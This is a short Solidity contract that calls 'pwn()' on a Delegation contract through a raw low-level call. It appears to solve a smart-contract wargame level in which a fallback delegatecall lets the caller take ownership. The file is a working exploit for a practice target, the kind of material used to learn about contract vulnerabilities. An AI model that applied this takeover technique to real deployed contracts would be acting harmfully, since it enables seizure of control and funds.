// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Delegation.sol"; 

contract DelegationCaller {
  Delegation delegation;

  constructor(Delegation _delegation) public {
    delegation = _delegation;
  }

  function callDelegation() public {
    (bool success, ) = address(delegation).call(
      abi.encodeWithSignature("pwn()")
    );
  }
}